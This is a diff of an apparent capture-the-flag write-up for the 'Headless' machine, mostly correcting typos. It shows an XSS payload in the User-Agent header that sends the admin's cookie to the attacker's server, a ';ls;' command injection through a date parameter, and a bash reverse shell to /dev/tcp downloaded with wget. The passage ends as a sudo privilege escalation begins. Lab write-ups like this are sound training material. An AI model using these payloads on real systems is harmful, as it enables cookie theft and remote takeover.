@@ -165,14 +165,14 @@ Task Completed
 ## Vulnerability Assessment
 
 Support page with input fields caught my interest, so, I started testing the input fields manually.
-- First tried for SQL injection, I geve single quote(') and double quotes(") as input to every input fields, but there was no any suspicious response.
+- First tried for SQL injection, I gave single quote(') and double quotes(") as input to every input fields, but there was no any suspicious response.
 - Then I tried for XSS. I gave `<XSS>` (word XSS wrapped in angular bracket) as input and I got a suspisious looking message, which means the app is vulnerable to XSS.
     - ![suspicious message](../.medias/headless/sus_response.jpg)
 
-The message said that hacking attemp was detected so my browser information was sent to administrator. 
+The message said that hacking attemp was detected so a report with my browser information was sent to administrator. 
 
 ### Building strategy
-Now it's time to build some strategy. Here our browser information is being sent to administrator, and our browser information is stored in User-Agent header. So, if we set our payload in User-Agent header by using burpsuite, our payload is gonna reach the administrator. 
+Now it's time to build some strategy. Here our browser information is being sent to administrator, and our browser information is stored in User-Agent header. So, if we set/embed our payload in User-Agent header by using burpsuite, our payload is gonna reach the administrator. 
 
 But what will we do after reaching to administrator?
 
@@ -180,8 +180,9 @@ Absolutely right, we are not able to fetch dashboard page because our cookie is 
 
 ## Exploitation
 
-First I started a http server using command `python -m httpserver`. It started a server on my ip on port 8000. I intercepted the request using burp and edited the User-Agent header with my payload 
+First I started a http server using command `python -m httpserver`. It started a server on my ip on port 8000. I intercepted the request using burp and edited the User-Agent header with my payload:
 ```html
+<!-- payload -->
 <svg onload='fetch("http://my_ip:port/" + document.cookie)>
 ```
 and sent the request. Within 5-6 seconds I recieved message with admin's cookie in my terminal.
@@ -194,8 +195,8 @@ Here we have option to generate report from the dashboard. Let's generate the re
 ![generating report](../.medias/headless/generate_report.jpg)
 
 Date parameter is sent using post request. So there could be the possibility of OS command injection if inputs are not validated properly.
-- first attemp, I concatenated the date parameter with `;whoami` but didnot get expected result.
-- second try, then  I modified my payload as `;whoami;` then I got the output exactly what I wished for 😍.
+- first attemp, I concatenated the date parameter with `;ls` but didnot get expected result.
+- second try, then  I modified my payload as `;ls;` then I got the output exactly what I wished for 😍.
 ![command injection worked!](../.medias/headless/command_injection.jpg)
 
 
@@ -210,7 +211,7 @@ step 1 => build an executable file with payload to get reverse shell.
 echo "bash -i >& /dev/tcp/10.10.14.116/1234 0>&1;" > reverse_shell.sh
 chmod +x reverse_shell.sh
 ```
-step 2 => start the python server with `python -m http.server` and then use `wget http://<ipaddress>port/`to upload reverse shell on victims machine.
+step 2 => start the python server with `python -m http.server` and then use `wget http://<ipaddress>port/`to upload reverse shell on victim's machine.
 ![upload reverse shell](../.medias/headless/upload_reverseshell.jpg)
 
 Now since the reverse shell is uploaded, lets run the script using `bash reverse_shell.sh` command. We got the reverse shell. Now again exploring through the file system we can easily acquire the user flag.
@@ -244,7 +245,7 @@ User dvir may run the following commands on headless:
 ```
 So, divr can run /usr/bin/syscheck with root previlege. Let's try to exploit this thing.
 
-wheh we cat out /usr/bin/syscheck, we got that some init.db file is getting executed.
+when we cat out /usr/bin/syscheck, we got that some initdb.sh file is getting executed.
 ```bash
 dvir@headless:~$ cat /usr/bin/syscheck
 #!/bin/bash
@@ -273,7 +274,7 @@ fi
 exit 0
 ```
 
-I tried searching for that init.db but could not find. Even i usee find command to search in root directory (/) but the result was disappointing 😮‍💨.
+I tried searching for that initdb.sh but could not find. Even i used find command to search in root directory (/) but the result was disappointing 😮‍💨.
 So, I thought, if there isn't such file, why don't I create it myself and let the system run it with sudo previlege?
 
 ```bash
